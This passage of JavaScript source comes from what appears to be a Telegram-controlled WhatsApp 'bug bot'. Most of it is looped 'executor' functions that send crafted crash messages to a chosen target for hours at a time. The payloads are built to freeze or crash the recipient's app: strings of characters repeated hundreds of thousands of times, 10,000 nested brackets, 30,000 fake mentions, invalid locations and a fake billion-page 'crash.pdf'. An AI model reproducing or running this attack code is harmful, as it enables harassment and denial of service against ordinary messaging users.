        await userBot.sendMessage(chatId, `Error in delayking: ${error.message}. Process stopped.`);
        return;
      }
    }

    console.log(chalk.green(`Finished batch ${batch}`));
    batch++;

    if (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }

  console.log(chalk.cyan(`Done! Total batches sent: ${batch - 1}`));
}

async function XeonDelay1(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            bulldozer(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function callXeonExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            callXeon(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonMxExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonMx(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonUltraDelayExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonUltraDelay(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in ultra delay: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonUiKingExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonUiKing(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in uking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonUiKingGpExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonUiKingGp(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in groupui: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonIosGroupInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonIosInviGp(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in groupios: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function XiosInviNew(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  const maxLoops = 25;

  while (Date.now() - startTime < totalDurationMs) {
    let count = 0;
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      
      while (count < maxLoops) {
        await Promise.all([
          xiosinv(target, userNumber, chatId, botInstance)
        ]);
        await sleep(1000);
        console.log(`🦄 Sent iosinvisible to ${target} ${count + 1}/${maxLoops}`);
        count++;
        
        if (count >= maxLoops) {
          console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
          await new Promise(resolve => setTimeout(resolve, 10000));
          count = 0;
        }
      }
    } catch (error) {
      console.error(`❌ Error in iosinvisible: ${error.message}`);
      const userBot = getUserBot(botInstance);
      await userBot.sendMessage(chatId, `❌ Error in iosinvisible: ${error.message}. Process stopped.`);
      return; // Stop the function after one error
    }
  }
  console.log(`✅ Done! Completed sending iosinvisible to ${target}`);
}

async function XiosInviOld(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  const maxLoops = 25;

  while (Date.now() - startTime < totalDurationMs) {
    let count = 0;
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      
      while (count < maxLoops) {
        await Promise.all([
          xeonIosInvi(target, userNumber, chatId, botInstance)
        ]);
        await sleep(1000);
        console.log(`🦄 Sent iosinvisible to ${target} ${count + 1}/${maxLoops}`);
        count++;
        
        if (count >= maxLoops) {
          console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
          await new Promise(resolve => setTimeout(resolve, 10000));
          count = 0;
        }
      }
    } catch (error) {
      console.error(`❌ Error in iosvisible: ${error.message}`);
      const userBot = getUserBot(botInstance);
      await userBot.sendMessage(chatId, `❌ Error in iosvisible: ${error.message}. Process stopped.`);
      return; // Stop the function after one error
    }
  }
  console.log(`✅ Done! Completed sending iosinvisible to ${target}`);
}

async function xeonSpamDroidInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      await xeonSpamDroid(target, userNumber, chatId, botInstance);
      await sleep(1000);
      await forcer(target, userNumber, chatId, botInstance);
      await sleep(1000);
      console.log(`🦄 Sent iosvisible to ${target}`);
    } catch (error) {
      console.error(`❌ Error while sending: ${error.message}`);
      if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`Bug fcspambeta ended for ${target} ✅`);
        return;
      }
    }
  }
  console.log(`✅ Done! Completed sending fcspambeta to ${target}`);
}

async function jammerxInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      await jammerking(target, userNumber, chatId, botInstance);
      await sleep(1000);
    } catch (error) {
      console.error(`❌ Error while sending: ${error.message}`);
      if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`Bug jammerx ended for ${target} ✅`);
        return;
      }
    }
  }
  console.log(`✅ Done! Completed sending jammerx to ${target}`);
}

async function delayxInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      await jammerking2(target, userNumber, chatId, botInstance);
      await sleep(1000);
    } catch (error) {
      console.error(`❌ Error while sending: ${error.message}`);
      if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`Bug delayx ended for ${target} ✅`);
        return;
      }
    }
  }
  console.log(`✅ Done! Completed sending delayx to ${target}`);
}

async function delaypermaInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      await xeonGalaxtos(target, userNumber, chatId, botInstance);
      await sleep(1000);
    } catch (error) {
      console.error(`❌ Error while sending: ${error.message}`);
      if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`Bug delayperma ended for ${target} ✅`);
        return;
      }
    }
  }
  console.log(`✅ Done! Completed sending delayperma to ${target}`);
}

async function groupMixInitiator(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
      await xeonVideoGroupAndroid(target, userNumber, chatId, botInstance);
      await sleep(1000);
      await xeonIosInviGp(target, userNumber, chatId, botInstance);
      await sleep(1000);
      await xeonStatusGroupAndroid(target, userNumber, chatId, botInstance);
      await sleep(1000);
      await xeonIosInviGp(target, userNumber, chatId, botInstance);
      await sleep(1000);
      console.log(`🦄 Sent groupmix to ${target}`);
    } catch (error) {
      console.error(`❌ Error while sending: ${error.message}`);
      if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`Bug groupmix ended for ${target} ✅`);
        return;
      }
    }
  }
  console.log(`✅ Done! Completed sending groupmix to ${target}`);
}

async function forcexgroup(target, userNumber, chatId, botInstance, loopCount = 5) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  // Validate group JID
  if (!target.endsWith('@g.us')) {
    throw new Error('Invalid group JID. It must end with @g.us');
  }

  const userSock = sessions.get(userNumber);
  const userBot = getUserBot(botInstance);

  try {

    for (let i = 0; i < loopCount; i++) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        throw new Error('No active WhatsApp session');
      }

      await sleep(1050);
      await userSock.relayMessage(target, {
        messageContextInfo: {
          messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
          deviceListMetaData: {},
          deviceListMetadataVersion: 2
        },
        scheduledCallCreationMessage: {
          scheduledTimestampMs: '1200',
          callType: "AUDIO",
          title: '👻'
        }
      }, {
        additionalAttributes: {
          edit: '7'
        }
      });
    }
  } catch (error) {
  console.error(`Error in forcexgroup for ${userNumber}:`, error.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in forcegroup: ${error.message}. Process stopped.`);
  throw error; // Keep the throw to maintain behavior, but only one error message is sent
}
}

// Function for forceblock
async function forceblock(target, userNumber, chatId, botInstance, loopCount = 5) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const userSock = sessions.get(userNumber);

  try {
    for (let i = 0; i < loopCount; i++) {
      await sleep(1050);
      await userSock.relayMessage(target, {
        messageContextInfo: {
          messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
          deviceListMetaData: {},
          deviceListMetadataVersion: 2
        },
        scheduledCallCreationMessage: {
          scheduledTimestampMs: '1200',
          callType: "AUDIO",
          title: '👻'
        }
      }, {
        additionalAttributes: {
          edit: '7'
        }
      });
    }
  } catch (error) {
    console.error(`Error in forceblock for ${userNumber}:`, error.message);
    throw error;
  }
}

async function xiosinv(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: 'Telegram: @dgxeon13\n',
                    description: "\n\n\n" + "𑪆".repeat(260000),
                    singleSelectReply: {
                        selectedId: "id"
                    },
                    listType: 1
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
    });
    await userSock.relayMessage(target, {
        groupStatusMessageV2: {
            message: msg.message
        }
    }, {
        participant: { jid: target }
    });
  } catch (err) {
  console.error(`Error in iosinvisible for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in iosinvisible: ${err.message}. Process stopped.`);
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonIosInvi(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    await userSock.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ Telegram :: @dgxeon13 ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ Telegram :: @dgxeon13 ⛧`,
body: `Haii`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/dgxeon`
}
}
}, {})
  } catch (err) {
  console.error(`Error in iosvisible for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in iosvisible: ${err.message}. Process stopped.`);
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonBetaPayment(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    userSock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: 'Telegram: @dgxeon13'
            },
            header: {
                hasMediaAttachment: true,
                jpegThumbnail: o,
                contextInfo: {
                participant: target
                }
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "payment_method",
                        buttonParamsJson: "{\"reference_id\":\"X\",\"payment_method\":\"confirmm\",\"payment_timestamp\":null,\"share_payment_status\":false\"}"
                    }
                ]
            }
        }
    }, {
    participant: { jid: target },
    additionalNodes: [
            {
                tag: 'biz',
                attrs: { native_flow_name: 'payment_method' }
            }
        ]
    });
  } catch (err) {
    console.error(`Error in fcbeta for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xsiphone(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);
	const msg = {
    "viewOnceMessage": {
      "message": {
        "listResponseMessage": {
          "title": "Telegram: @dgxeon13",
          "listType": "SINGLE_SELECT",
          "singleSelectReply": {},
          "description": xeonKingIos
        }
      }
    }
  };
  const allmsg = generateWAMessageFromContent(target, proto.Message.fromObject(msg), {});
  userSock.relayMessage(target, allmsg.message, { messageId: allmsg.key.sender });
  } catch (err) {
    console.error(`Error in xsiphone for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xeonAndroidInvisible(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Telegram: @dgxeon13",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "Telegram: @dgxeon13",
                address: "Telegram: @dgxeon13",
              },
            },
            body: {
              text: "Telegram: @dgxeon13",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await userSock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.error(`Error in xdroidinvisible for ${userNumber}:`, err.message);
    throw err;
  }
}

async function forcer(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

const rajaXeon = {
  key: {
    remoteJid: '120363401744741900@g.us',
    fromMe: true,
    id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
    participant: '916909137213@s.whatsapp.net'
  },
  messageTimestamp: 1753786706,
  pushName: 'Telegram: @dgxeon13',
  broadcast: false,
  status: 2,
  message: {
    conversation: 'Telegram: @dgxeon13',
    messageContextInfo: {
      messageSecret: new Uint8Array([
        123, 153, 59, 66, 69, 1, 31, 219,
        233, 201, 204, 107, 149, 77, 233, 100,
        80, 15, 30, 192, 133, 13, 171, 48,
        44, 27, 61, 135, 73, 149, 172, 105
      ])
    }
  },
  id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
  isBaileys: false,
  chat: '120363401744741900@g.us',
  fromMe: true,
  isGroup: true,
  sender: '916909137213@s.whatsapp.net',
  participant: '916909137213@s.whatsapp.net',
  mtype: 'conversation',
  msg: 'Telegram: @dgxeon13',
  body: 'Telegram: @dgxeon13',
  quoted: null,
  mentionedJid: [],
  text: 'Telegram: @dgxeon13',
  reply: function() {}, // Placeholder for function
  copy: function() {}, // Placeholder for function
  copyNForward: function() {} // Placeholder for function
};

    await userSock.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 'Telegram: @dgxeon13',
        degreesLongitude: 'Telegram: @dgxeon13',
        name: `Telegram: @dgxeon13`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: userNumber + '@s.whatsapp.net',
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363274419284848@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug
          },
          externalAdReply: {
            title: ' Telegram: @dgxeon13 ',
            body: 'Telegram: @dgxeon13',
            mediaType: 0,
            thumbnail: rajaXeon,
            jpegThumbnail: rajaXeon,
            mediaUrl: `https://www.youtube.com/@dgxeon`,
            sourceUrl: `https://www.youtube.com/@dgxeon`
          }
        }
      }
    },
    {
      participant: {
        jid: target
      }
    },
    {
      messageId: null
    }
);
  } catch (err) {
    console.error(`Error in forcer for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xeonSpamDroid(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ꦾ".repeat(1000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              ...Array(18).fill().map(() => ({
                name: "mpm",
                buttonParamsJson: "",
              })),
            ],
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
          },
        },
      },
    },
  };
    
    await userSock.relayMessage(target, message, {
      messageId: null,
